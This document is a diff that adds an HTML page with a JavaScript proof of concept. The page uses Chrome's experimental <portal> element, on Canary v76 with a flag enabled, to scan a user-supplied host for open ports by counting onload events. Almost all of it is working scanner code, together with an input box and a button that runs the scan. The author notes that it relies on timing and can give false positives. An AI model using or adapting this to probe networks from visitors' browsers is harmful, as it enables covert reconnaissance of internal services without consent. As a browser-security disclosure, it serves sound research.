@@ -1,0 +1,47 @@
+<h2>Scan For Opened Ports Using &lt;portal&gt;</h2>
+Tested on Canary v76.0.3794.0<br>
+Don't forget to enable portals (chrome://flags/#enable-portals)<br>
+When the &lt;portal&gt; loads a normal page we will get one onload event but when the page doesn't exist or an error is thrown we will get &gt;1 onload events<br>
+This POC depend on timing and it may give false postivies <br>
+Testing ports: {23,80,21,52,22,11,1337,99}
+<br>
+
+<script>
+var j =0;
+</script>
+<br><br>
+
+<script>
+function f(){
+var x = [23,80,21,52,22,11,1337,99];
+function nn(i) {
+  setTimeout(function() {
+    go(x[i]);}, i * 1000);}
+ for (var i = 0; i < x.length; ++i)
+             nn(i);
+}
+
+function go(x){
+portal = document.createElement('portal');
+portal.src = document.getElementById('n').value+":"+x;
+var att = document.createAttribute("onload")
+name=x;
+att.value = 'j+=1; setTimeout(function(){lol(name);j=0;},800);';
+portal.setAttributeNode(att);
+document.body.appendChild(portal);
+}
+
+function lol(){
+if(j==1){
+hh = document.createElement('h3');
+hh.style="color: red";
+hh.innerHTML="Port Found: "+name;
+n=document.getElementById('u');
+n.appendChild(hh);
+}}
+</script>
+
+<input id=n size=100><button onclick="j=0;f()">Scan</button>
+<div id=u></div>
+<hr>
+<!-- WHEN WROTE THIS CODE ONLY GOD AND I UNDERSTOOD HOw IT DOES NOW GOD ONLY KNOWS -->
